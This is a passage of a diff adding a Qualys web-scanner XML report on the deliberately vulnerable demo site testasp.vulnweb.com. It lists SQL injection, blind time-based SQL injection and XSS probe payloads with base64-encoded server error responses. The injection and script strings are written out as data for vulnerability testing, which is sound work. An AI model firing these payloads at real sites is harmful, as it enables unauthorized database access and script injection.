+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtJbmNvcnJlY3Qgc3ludGF4IG5lYXIgJyZndDsnLiZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7L1JlZ2lzdGVyLmFzcCZsdDsvZm9udCZndDsmbHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0OywgbGluZSAxNCZsdDsvZm9udCZndDsg]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[*/;(function()%7bqxss%7d);/*]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMmYnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtWaW9sYXRpb24gb2YgUFJJTUFSWSBLRVkgY29uc3RyYWludCAndXNlcnMkUHJpbWFyeUtleScuIENhbm5vdCBpbnNlcnQgZHVwbGljYXRlIGtleSBpbiBvYmplY3QgJ2Riby51c2VycycuJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDsvUmVnaXN0ZXIuYXNwJmx0Oy9mb250Jmd0OyZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7LCBsaW5lIDE0Jmx0Oy9mb250Jmd0OyA]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150022</qid>
+        <title><![CDATA[Syntax Error Occurred]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault.asp%3F]]></uri>
+        <param>tfUName</param>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <form><![CDATA[http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault.asp%3F]]></form>
+              <payloads>
+                <count>5</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[z--><qss>]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMmYnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtWaW9sYXRpb24gb2YgUFJJTUFSWSBLRVkgY29uc3RyYWludCAndXNlcnMkUHJpbWFyeUtleScuIENhbm5vdCBpbnNlcnQgZHVwbGljYXRlIGtleSBpbiBvYmplY3QgJ2Riby51c2VycycuJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDsvUmVnaXN0ZXIuYXNwJmx0Oy9mb250Jmd0OyZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7LCBsaW5lIDE0Jmx0Oy9mb250Jmd0OyA]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA["'><qss>]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtJbmNvcnJlY3Qgc3ludGF4IG5lYXIgJyZndDsnLiZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7L1JlZ2lzdGVyLmFzcCZsdDsvZm9udCZndDsmbHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0OywgbGluZSAxNCZsdDsvZm9udCZndDsg]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA["><qss>]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMmYnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtWaW9sYXRpb24gb2YgUFJJTUFSWSBLRVkgY29uc3RyYWludCAndXNlcnMkUHJpbWFyeUtleScuIENhbm5vdCBpbnNlcnQgZHVwbGljYXRlIGtleSBpbiBvYmplY3QgJ2Riby51c2VycycuJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDsvUmVnaXN0ZXIuYXNwJmx0Oy9mb250Jmd0OyZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7LCBsaW5lIDE0Jmx0Oy9mb250Jmd0OyA]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA["'><qss%20%60%3b!--=%26%7b()%7d>]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtJbmNvcnJlY3Qgc3ludGF4IG5lYXIgJyZndDsnLiZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7L1JlZ2lzdGVyLmFzcCZsdDsvZm9udCZndDsmbHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0OywgbGluZSAxNCZsdDsvZm9udCZndDsg]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[*/;(function()%7bqxss%7d);/*]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMmYnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtWaW9sYXRpb24gb2YgUFJJTUFSWSBLRVkgY29uc3RyYWludCAndXNlcnMkUHJpbWFyeUtleScuIENhbm5vdCBpbnNlcnQgZHVwbGljYXRlIGtleSBpbiBvYmplY3QgJ2Riby51c2VycycuJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDsvUmVnaXN0ZXIuYXNwJmx0Oy9mb250Jmd0OyZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7LCBsaW5lIDE0Jmx0Oy9mb250Jmd0OyA]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150003</qid>
+        <title><![CDATA[SQL Injection]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault.asp%3F]]></uri>
+        <param>tfRName</param>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <form><![CDATA[http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault.asp%3F]]></form>
+              <payloads>
+                <count>1</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[tfUName=John&tfRName=John'&tfEmail=was@qualys.com&tfUPass=password]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtVbmNsb3NlZCBxdW90YXRpb24gbWFyayBhZnRlciB0aGUgY2hhcmFjdGVyIHN0cmluZyAnSm9obicsJyknLiZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7L1JlZ2lzdGVyLmFzcCZsdDsvZm9udCZndDsmbHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0OywgbGluZSAxNCZsdDsvZm9udCZndDsg]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150112</qid>
+        <title><![CDATA[Sensitive form field has not disabled autocomplete]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault.asp%3F]]></uri>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <payloads>
+                <count>1</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[N/A]]></payload>
+                    <result base64="true"><![CDATA[Rm9ybSBmaWVsZCBkb2VzIG5vdCBzZXQgYXV0b2NvbXBsZXRlPSJvZmYiLg]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150004</qid>
+        <title><![CDATA[Path-Based Vulnerability]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/images/]]></uri>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <payloads>
+                <count>1</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[@PATH@images/]]></payload>
+                    <result base64="true"><![CDATA[Y29tbWVudDogVGhlIHNlcnZlciByZXNwb25kZWQgd2l0aCBhIHZlcmJvc2UgZXJyb3IgbWVzc2FnZSBmb3IgdGhpcyByZXF1ZXN0LgpIVFRQLzEuMSA0MDMgRm9yYmlkZGVu]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150012</qid>
+        <title><![CDATA[Blind SQL Injection]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/showthread.asp?id=32%3BWAITFOR%20DELAY%20%2700:00:28%27%3B]]></uri>
+        <param>id</param>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <payloads>
+                <count>5</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[id=32%20AND%20NULL%20IS%20NULL%20]]></payload>
+                    <result base64="true"><![CDATA[VGhpcyB2dWxuZXJhYmlsaXR5IHdhcyBpZGVudGlmaWVkIHVzaW5nIHRoZSBkaWZmZXJlbmNlIGluIHJlc3BvbnNlcyBmb3IgVFJVRSBhbmQgRkFMU0UgcGF5bG9hZHMuIFRoaXMgdnVsbmVyYWJpbGl0eSBpcyBjb25maXJtZWQgYmFzZWQgb24gdGhlIGRpZmZlcmVuY2UgaW4gdGhlIHJlc3BvbnNlIGNvZGVzLgoKVHJ1ZSByZXNwb25zZSBzdGF0dXMgY29kZTogMjAwCiBGYWxzZSByZXNwb25zZSBzdGF0dXMgY29kZTogNTAwCgpUcnVlIGNvbmRpdGlvbjoKCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL3Nob3d0aHJlYWQuYXNwP2lkPTMyJTIwQU5EJTIwTlVMTCUyMElTJTIwTlVMTCUyMAoKRmFsc2UgY29uZGl0aW9uOgoKaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vc2hvd3RocmVhZC5hc3A_aWQ9MzIlMjBBTkQlMjA3JTIwSVMlMjBOVUxMJTIw]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[WAITFOR%20DELAY%20%27@DELAY_HMS@%27]]></payload>
+                    <result base64="true"><![CDATA[Y29tbWVudDogKFRpbWVzIGFyZSBleHByZXNzZWQgaW4gbWlsbGlzZWNvbmRzLikKRXhwZWN0ZWQgcmVzcG9uc2UgZGVsYXk6IDI4MTkzCk9ic2VydmVkIHJlc3BvbnNlIGRlbGF5OiAyODE4MApNZWFuIHJlc3BvbnNlIHRpbWU6IDE5MwpTdGFuZGFyZCBkZXZpYXRpb246IDE3OQpOdW1iZXIgb2Ygc3RkZGV2IGZyb20gbWVhbjogMTU2LjI2MTc5NwoKVGhpcyB2dWxuZXJhYmlsaXR5IHdhcyBpZGVudGlmaWVkIHVzaW5nIHRpbWUtYmFzZWQgaW5mZXJlbmNlIHRoYXQgY29tcGFyZWQgdGhlIGF2ZXJhZ2UgcmVzcG9uc2UgdGltZSBvZiBhIHBhZ2UgdG8gaXRzIHJlc3BvbnNlIHRpbWUgd2l0aCBhbiBpbmplY3RlZCBwYXlsb2FkLiBUaGlzIHZ1bG5lcmFiaWxpdHkgaXMgY29uZmlybWVkIGJhc2VkIG9uIHRpbWluZyByYXRoZXIgdGhhbiB0aGUgY29udGVudCBvZiB0aGUgcmVzcG9uc2UuCg]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[id=32%20OR%204%3D4--%20]]></payload>
+                    <result base64="true"><![CDATA[VGhpcyB2dWxuZXJhYmlsaXR5IHdhcyBpZGVudGlmaWVkIHVzaW5nIHRoZSBkaWZmZXJlbmNlIGluIHJlc3BvbnNlcyBmb3IgVFJVRSBhbmQgRkFMU0UgcGF5bG9hZHMuIFRoaXMgdnVsbmVyYWJpbGl0eSBpcyBjb25maXJtZWQgYmFzZWQgb24gdGhlIGRpZmZlcmVuY2UgaW4gdGhlIHJlc3BvbnNlIGNvbnRlbnQuCgpDb250ZW50IG9mIGFsbCBUUlVFIHJlc3BvbnNlcyBkaWZmZXIgZnJvbSBGQUxTRSByZXNwb25zZXMuCgpUcnVlIGNvbmRpdGlvbjoKCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL3Nob3d0aHJlYWQuYXNwP2lkPTMyJTIwT1IlMjA0JTNENC0tJTIwCgpGYWxzZSBjb25kaXRpb246CgpodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS9zaG93dGhyZWFkLmFzcD9pZD0zMiUyMEFORCUyMDQlM0Q1LS0lMjA]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[;WAITFOR%20DELAY%20%27@DELAY_HMS@%27;]]></payload>
+                    <result base64="true"><![CDATA[Y29tbWVudDogKFRpbWVzIGFyZSBleHByZXNzZWQgaW4gbWlsbGlzZWNvbmRzLikKRXhwZWN0ZWQgcmVzcG9uc2UgZGVsYXk6IDI4MTkzCk9ic2VydmVkIHJlc3BvbnNlIGRlbGF5OiAyODI3NQpNZWFuIHJlc3BvbnNlIHRpbWU6IDE5MwpTdGFuZGFyZCBkZXZpYXRpb246IDE3OQpOdW1iZXIgb2Ygc3RkZGV2IGZyb20gbWVhbjogMTU2Ljc5MjIzMwoKVGhpcyB2dWxuZXJhYmlsaXR5IHdhcyBpZGVudGlmaWVkIHVzaW5nIHRpbWUtYmFzZWQgaW5mZXJlbmNlIHRoYXQgY29tcGFyZWQgdGhlIGF2ZXJhZ2UgcmVzcG9uc2UgdGltZSBvZiBhIHBhZ2UgdG8gaXRzIHJlc3BvbnNlIHRpbWUgd2l0aCBhbiBpbmplY3RlZCBwYXlsb2FkLiBUaGlzIHZ1bG5lcmFiaWxpdHkgaXMgY29uZmlybWVkIGJhc2VkIG9uIHRpbWluZyByYXRoZXIgdGhhbiB0aGUgY29udGVudCBvZiB0aGUgcmVzcG9uc2UuCg]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[id=32%20OR%20NULL%20IS%20NULL%20]]></payload>
+                    <result base64="true"><![CDATA[VGhpcyB2dWxuZXJhYmlsaXR5IHdhcyBpZGVudGlmaWVkIHVzaW5nIHRoZSBkaWZmZXJlbmNlIGluIHJlc3BvbnNlcyBmb3IgVFJVRSBhbmQgRkFMU0UgcGF5bG9hZHMuIFRoaXMgdnVsbmVyYWJpbGl0eSBpcyBjb25maXJtZWQgYmFzZWQgb24gdGhlIGRpZmZlcmVuY2UgaW4gdGhlIHJlc3BvbnNlIGNvZGVzLgoKVHJ1ZSByZXNwb25zZSBzdGF0dXMgY29kZTogNTAwCiBGYWxzZSByZXNwb25zZSBzdGF0dXMgY29kZTogMjAwCgpUcnVlIGNvbmRpdGlvbjoKCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL3Nob3d0aHJlYWQuYXNwP2lkPTMyJTIwT1IlMjBOVUxMJTIwSVMlMjBOVUxMJTIwCgpGYWxzZSBjb25kaXRpb246CgpodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS9zaG93dGhyZWFkLmFzcD9pZD0zMiUyME9SJTIwNiUyMElTJTIwTlVMTCUyMA]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150022</qid>
+        <title><![CDATA[Syntax Error Occurred]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/showthread.asp?id=*%2F%3B(function()%7bqxss%7d)%3B%2F*]]></uri>
+        <param>id</param>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <payloads>
+                <count>5</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[*/;(function()%7bqxss%7d);/*]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtTeW50YXggZXJyb3IsIHBlcm1pc3Npb24gdmlvbGF0aW9uLCBvciBvdGhlciBub25zcGVjaWZpYyBlcnJvciZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7L3Nob3d0aHJlYWQuYXNwJmx0Oy9mb250Jmd0OyZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7LCBsaW5lIDkmbHQ7L2ZvbnQmZ3Q7IA]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[%20<script>_q_q=random()</script>]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtJbmNvcnJlY3Qgc3ludGF4IG5lYXIgJyZsdDsnLiZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7L3Nob3d0aHJlYWQuYXNwJmx0Oy9mb250Jmd0OyZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7LCBsaW5lIDkmbHQ7L2ZvbnQmZ3Q7IA]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[<script%20=">"%20SRC=//localhost/j>]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtJbmNvcnJlY3Qgc3ludGF4IG5lYXIgJyZsdDsnLiZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7L3Nob3d0aHJlYWQuYXNwJmx0Oy9mb250Jmd0OyZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7LCBsaW5lIDkmbHQ7L2ZvbnQmZ3Q7IA]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[z--><qss>]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtJbnZhbGlkIGNvbHVtbiBuYW1lICd6Jy4mbHQ7L2ZvbnQmZ3Q7CiZsdDtwJmd0OwombHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0Oy9zaG93dGhyZWFkLmFzcCZsdDsvZm9udCZndDsmbHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0OywgbGluZSA5Jmx0Oy9mb250Jmd0OyA]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[<script%20src=//localhost/j>]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtJbmNvcnJlY3Qgc3ludGF4IG5lYXIgJyZsdDsnLiZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7L3Nob3d0aHJlYWQuYXNwJmx0Oy9mb250Jmd0OyZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7LCBsaW5lIDkmbHQ7L2ZvbnQmZ3Q7IA]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150003</qid>
+        <title><![CDATA[SQL Injection]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/showthread.asp?id='%3B(function()%7bqxss%7d)%3B%2F%2F]]></uri>
+        <param>id</param>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <payloads>
+                <count>5</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[id=%22%3E%3Cqss%3E]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtVbmNsb3NlZCBxdW90YXRpb24gbWFyayBhZnRlciB0aGUgY2hhcmFjdGVyIHN0cmluZyAnJmd0OyZsdDtxc3MmZ3Q7Jy4mbHQ7L2ZvbnQmZ3Q7CiZsdDtwJmd0OwombHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0Oy9zaG93dGhyZWFkLmFzcCZsdDsvZm9udCZndDsmbHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0OywgbGluZSA5Jmx0Oy9mb250Jmd0OyA]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[id=%22'%3E%3Cqss%20%60%3b!--%3D%26%7b()%7d%3E]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtVbmNsb3NlZCBxdW90YXRpb24gbWFyayBhZnRlciB0aGUgY2hhcmFjdGVyIHN0cmluZyAnJyZndDsmbHQ7cXNzIGA7IS0tPSZhbXA7eygpfSZndDsnLiZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7L3Nob3d0aHJlYWQuYXNwJmx0Oy9mb250Jmd0OyZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7LCBsaW5lIDkmbHQ7L2ZvbnQmZ3Q7IA]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[id=%22'%3E%3C%3CSCRIPT%20a%3D2%3Eqss%3D7%3B%2F%2F%3C%3C%2FSCRIPT%3E]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtVbmNsb3NlZCBxdW90YXRpb24gbWFyayBhZnRlciB0aGUgY2hhcmFjdGVyIHN0cmluZyAnJyZndDsmbHQ7Jmx0O1NDUklQVCBhPTImZ3Q7cXNzPTc7Ly8mbHQ7Jmx0Oy9TQ1JJUFQmZ3Q7Jy4mbHQ7L2ZvbnQmZ3Q7CiZsdDtwJmd0OwombHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0Oy9zaG93dGhyZWFkLmFzcCZsdDsvZm9udCZndDsmbHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0OywgbGluZSA5Jmx0Oy9mb250Jmd0OyA]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[id=32%22'%3E%3Cqss%3E]]></payload>
